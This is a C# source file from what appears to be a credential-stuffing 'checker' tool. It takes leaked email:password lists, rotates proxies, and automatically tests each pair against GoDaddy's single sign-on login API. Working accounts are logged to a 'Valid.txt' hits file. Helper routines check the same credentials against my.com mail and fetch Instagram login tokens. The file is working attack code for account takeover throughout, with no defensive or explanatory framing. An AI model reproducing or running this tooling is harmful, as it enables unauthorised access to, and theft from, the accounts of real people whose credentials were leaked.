﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using AuthGG;
using Leaf.xNet;
using ZuttPal;
using Console = Colorful.Console;
namespace ZuttPal
{
	internal class check26
	{
		public static string Path;
		private static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();



		public static void startchecker1()
		{
			for (; ; )
			{
				while (!Checking30.Combo.IsEmpty)
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Checking30.Combo.TryDequeue(out string acc))
						{
							try
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								string account = email + ":" + password;
								httpRequest.Proxy = Checking30.RandomProxies();
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.KeepAlive = true;
								httpRequest.ConnectTimeout = Program.config.timeout;
								httpRequest.SslProtocols = System.Security.Authentication.SslProtocols.Tls12;
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.AllowAutoRedirect = false;
								httpRequest.AddHeader("Cookie", "visitor=vid=b35ec6bc-83fe-429e-9166-e335881f061a;");
								httpRequest.AddHeader("Host", "sso.godaddy.com");
								httpRequest.AddHeader("Origin", "https://sso.godaddy.com");
								httpRequest.AddHeader("Referer", "https://sso.godaddy.com/?realm=idp&path=%2Fproducts&app=account");
								httpRequest.AddHeader("Sec-Fetch-Dest", "empty");
								httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
								httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
								string str1 = "{\"checkusername\":\"" + email + "\"}";
								string str2 = httpRequest.Post("https://sso.godaddy.com/v1/api/idp/user/checkusername", str1, "application/json").ToString();
								if (str2.Contains("username is unavailable") || str2.Contains("message\": \"Ok"))
								{
									httpRequest.AddHeader("Cookie", "visitor=vid=b35ec6bc-83fe-429e-9166-e335881f061a;");
									httpRequest.AddHeader("Host", "sso.godaddy.com");
									httpRequest.AddHeader("DNT", "1");
									httpRequest.AddHeader("Origin", "https://sso.godaddy.com");
									httpRequest.AddHeader("Referer", "https://sso.godaddy.com/?realm=idp&path=%2Fproducts&app=account");
									httpRequest.AddHeader("Sec-Fetch-Dest", "empty");
									httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
									httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36");
									string str3 = "{\"username\":\"" + email + "\",\"password\":\"" + password + "\",\"remember_me\":false,\"plid\":1,\"API_HOST\":\"godaddy.com\",\"captcha_code\":\"\",\"captcha_type\":\"recaptcha_v2_invisible\"}";
									string str4 = httpRequest.Post("https://sso.godaddy.com/v1/api/idp/login?realm=idp&path=%2Fproducts&app=account", str3, "application/json").ToString();
									if (str4.Contains("message\": \"Ok\""))
									{
										Interlocked.Increment(ref Checking30.CheckedLines);
										Interlocked.Increment(ref Checking30.currentCpm);
										Interlocked.Increment(ref Checking30.Hits);
										if (Program.config.printgood == "True")
										{

											Console.WriteLine("[»] Valid - " + acc, Color.Green);
										}
										Save(Path + "\\Valid.txt", acc);
										break;
									}
									else if (!str4.Contains("Username and password did not match"))
									{
										Interlocked.Increment(ref Checking30.CheckedLines);
										Interlocked.Increment(ref Checking30.currentCpm);
										Interlocked.Increment(ref Checking30.Bad);
										if (Program.config.printbad == "True")
										{
											Console.WriteLine("[»] Invalid - " + account, Color.Red);
										}
										break;
									}
									else if (str2.Contains("username is invalid") && str2.Contains("username is available"))
									{
										Interlocked.Increment(ref Checking30.CheckedLines);
										Interlocked.Increment(ref Checking30.currentCpm);
										Interlocked.Increment(ref Checking30.Bad);
										if (Program.config.printbad == "True")
										{
											Console.WriteLine("[»] Invalid - " + account, Color.Red);
										}
										break;
									}
								}
							}
							catch (Exception )
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								var account = email + password;
								string acc1 = email + ":" + password;
								Checking30.Combo.Enqueue(acc1);
								Interlocked.Increment(ref Checking30.retry);
							}
						}
					}
				}
			}
		}
		static Random random = new Random();
		public static string GetRandomHexNumber(int digits)
		{
			byte[] buffer = new byte[digits / 2];
			random.NextBytes(buffer);
			string result = String.Concat(buffer.Select(x => x.ToString("X2")).ToArray());
			if (digits % 2 == 0)
				return result;
			return result + random.Next(16).ToString("X");
		}
		

		private static string MailAccessCheck(string email, string password)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						httpRequest.Proxy = Checking30.RandomProxies();
						httpRequest.UserAgent = "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0";
						if (httpRequest.Get(new Uri("https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=" + email + "&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=en_FR&Password=" + password + "&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&")).ToString().Contains("Ok=1"))
							return "Working";
						break;
					}
				}
				catch
				{
					string acc1 = email + ":" + password;
					Checking30.Combo.Enqueue(acc1);
					Interlocked.Increment(ref Checking30.retry);
				}
			}
			return "";
		}
		private static string InstagramGetCSRF(ref CookieStorage cookies)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						httpRequest.Proxy = Checking30.RandomProxies();
						httpRequest.IgnoreProtocolErrors = true;
						httpRequest.AllowAutoRedirect = false;
						cookies = new CookieStorage();
						httpRequest.Cookies = cookies;
						httpRequest.UserAgent = "Instagram 25.0.0.26.136 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-J730F; j7y17lte; samsungexynos7870)";
						httpRequest.Get(new Uri("https://i.instagram.com/api/v1/accounts/login/")).ToString();
						return cookies.GetCookies("https://i.instagram.com")["csrftoken"].Value;
					}
				}
				catch
				{
					Interlocked.Increment(ref Checking30.retry);
				}
			}
		}

		public static string yey(string source, string left, string right)
		{
			return source.Split(new string[]
			{
				left
			}, StringSplitOptions.None)[1].Split(new string[]
			{
				right
			}, StringSplitOptions.None)[0];
		}
		public static void Save(string path, string line)
			{
			for (; ; )
			{
				try
				{
					File.AppendAllLines(path ?? "", new List<string>
					{
						line
					}, Encoding.UTF8);
					break;
				}
				catch
				{
				}
			}
		}

		public static string uri = "";

		public static string auther = "";

		public static string printbad = "";

		public static string printlocked = "";

		public static List<string> Tokens = new List<string>();

		public static List<string> Urls = new List<string>();

		public static List<string> Auther = new List<string>();

		public static List<ProxyClient> ProxyList = new List<ProxyClient>();
	}
}
